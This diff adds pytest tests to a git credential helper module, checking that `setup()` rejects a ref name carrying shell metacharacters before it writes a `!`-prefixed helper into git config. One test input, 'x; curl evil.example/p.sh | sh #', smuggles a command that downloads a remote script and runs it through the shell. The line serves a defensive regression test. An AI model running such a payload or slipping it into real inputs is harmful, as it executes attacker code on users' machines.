@@ -80,3 +80,37 @@ def test_no_grant_denies_but_does_not_crash(tmp_path, monkeypatch):
     rc, out = _run("get", "github_token")
     assert rc == 0
     assert "password=" not in out  # deny-by-default holds; git falls back
+
+
+class TestSetupRefValidation:
+    """`setup()` embeds `ref` unescaped into a `credential.<url>.helper`
+    git-config value, and a `!`-prefixed helper value is run by git via
+    `sh -c` -- so an unvalidated ref is a shell-injection path into
+    ~/.gitconfig. Found in review: every other name-taking path in this
+    module validates through SecretRef first; `setup()` was the one that
+    didn't."""
+
+    def test_shell_metacharacter_ref_is_rejected_before_any_git_config_call(
+        self, vault, monkeypatch
+    ):
+        calls = []
+        monkeypatch.setattr(
+            gc.subprocess, "run",
+            lambda *a, **kw: calls.append(a) or type("R", (), {"returncode": 0})(),
+        )
+        rc = gc.setup("github.com", "x; curl evil.example/p.sh | sh #")
+        assert rc == 1
+        assert calls == []  # nothing was ever written to git config
+
+    def test_valid_ref_is_accepted_and_configures_git(self, vault, monkeypatch):
+        calls = []
+
+        def _fake_run(cmd, **kw):
+            calls.append(cmd)
+            return type("R", (), {"returncode": 0, "stdout": "", "stderr": ""})()
+
+        monkeypatch.setattr(gc.subprocess, "run", _fake_run)
+        rc = gc.setup("github.com", "github_token")
+        assert rc == 0
+        set_calls = [c for c in calls if "--unset-all" not in c]
+        assert any("!paladin git-credential --ref github_token" in c for c in set_calls)
